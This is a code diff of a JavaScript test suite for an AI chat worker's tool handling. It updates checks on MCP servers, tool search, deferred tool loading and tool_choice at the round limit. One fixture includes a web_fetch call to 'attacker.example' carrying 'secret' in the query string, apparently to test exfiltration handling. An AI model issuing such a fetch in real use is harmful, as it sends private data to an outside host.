@@ -104,7 +104,9 @@ test("三个模型的 SDK 请求都启用消息级 effort，工具续跑继承�
         assert.equal(body.model, GOD_CHAT_TIER_INFO[tier].model);
         assert.ok(body.tools?.every((tool) => !("name" in tool) || !["draft_github_issue", "start_design", "propose_build"].includes(tool.name)));
         assert.equal(body.output_config, undefined);
-        assert.deepEqual(body.mcp_servers?.map((server) => server.name), ["context7", "cloudflare-docs"]);
+        assert.deepEqual(body.mcp_servers?.map((server) => server.name), ["context7", "cloudflare-docs", "grep-app", "deepwiki"]);
+        assert.ok(body.tools?.some((tool) => tool.type === "tool_search_tool_bm25_20251119"));
+        assert.ok(body.tools?.filter((tool) => "name" in tool && ["anime_search", "game_search"].includes(tool.name)).every((tool) => "defer_loading" in tool && tool.defer_loading));
         assert.ok(body.tools?.some((tool) => "name" in tool && tool.name === "web_search" && !("type" in tool)));
         assert.ok(body.tools?.some((tool) => "name" in tool && tool.name === "web_fetch"));
         assert.ok(headers.get("anthropic-beta")?.includes("mcp-client-2025-11-20"));
@@ -570,8 +572,8 @@ test("服务端无视工具关闭继续返回调用也不能延长工具循环",
   const { env, requests } = designEnv({ reply: (body) => modelStream(body.model, true) });
   const events = await parseEvents(await handleChat(chatRequest(), env, toolIO));
   assert.equal(requests.length, GOD_CHAT_LIMITS.maxToolRounds + 1);
-  assert.deepEqual(requests.at(-1)?.tools, []);
-  assert.ok(requests.every((request, i) => i < requests.length - 1 || request.mcp_servers === undefined));
+  assert.deepEqual(requests.at(-1)?.tool_choice, { type: "none" });
+  assert.ok(requests.slice(0, -1).every((request) => request.tool_choice === undefined));
   assert.ok(requests.at(-1)?.messages.some((m) => m.role === "system" && typeof m.content === "string" && m.content.startsWith("No tools remain")));
   assert.ok(events.some((event) => event.type === "text" && event.text.includes("ran out of steps")));
 });
@@ -589,7 +591,7 @@ test("web_search 走 Worker 调搜索服务，结果回成 search_result，引�
   };
   t.after(() => { globalThis.fetch = original; });
   const calls = [
-    { name: "web_search", input: { query: "deepseek pricing" } },
+    { name: "web_search", input: { query: "deepseek pricing", category: "web" } },
     { name: "web_fetch", input: { url: "https://attacker.example/?q=secret" } },
   ];
   const { env, requests } = designEnv({
